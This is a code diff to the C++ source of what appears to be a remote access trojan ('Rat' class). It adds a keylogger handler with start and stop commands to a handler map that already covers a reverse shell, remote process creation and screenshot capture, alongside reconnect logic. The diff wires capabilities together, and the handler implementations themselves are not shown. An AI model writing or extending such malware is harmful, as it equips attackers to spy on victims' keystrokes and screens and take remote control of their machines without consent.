@@ -2,6 +2,7 @@
 
 #include "ChatHandler.h"
 #include "CreateProcessHandler.h"
+#include "KeyLoggerHandler.h"
 #include "ReverseShellHandler.h"
 #include "TakeScreenshotHandler.h"
 #include "Trace.h"
@@ -20,14 +21,13 @@ Rat::Rat(
 			[this](const MessageType t, const SharedSpan c) { OnMessage(t, c); },
 			[this] { OnDisconnection(); })),
 	_handlers(GetHandlers())
-	//_keyLogger(_sender.get())
 {
 }
 
-std::map<MessageType, std::shared_ptr<IMessageHandler>> Rat::GetHandlers()
+std::map<MessageType, std::shared_ptr<IMessageHandler>> Rat::GetHandlers() const
 {
 	const auto reverseShellHandler = std::make_shared<ReverseShellHandler>(_sender.get());
-
+	const auto keyLoggerHandler = std::make_shared<KeyLoggerHandler>(_sender.get());
 
 	return {
 		{ MessageType::Chat, std::make_shared<ChatHandler>() },
@@ -36,6 +36,8 @@ std::map<MessageType, std::shared_ptr<IMessageHandler>> Rat::GetHandlers()
 		{ MessageType::StopReverseShell, reverseShellHandler },
 		{ MessageType::ReverseShellMessage, reverseShellHandler },
 		{ MessageType::TakeScreenshot, std::make_shared<TakeScreenshotHandler>(_sender.get())},
+		{ MessageType::StartKeyLog, keyLoggerHandler },
+		{ MessageType::StopKeyLog, keyLoggerHandler }
 	};
 }
 
@@ -69,5 +71,4 @@ void Rat::OnDisconnection()
 			Trace("Failed to connect! Trying to reconnect\n");
 		}
 	}
-		
 }
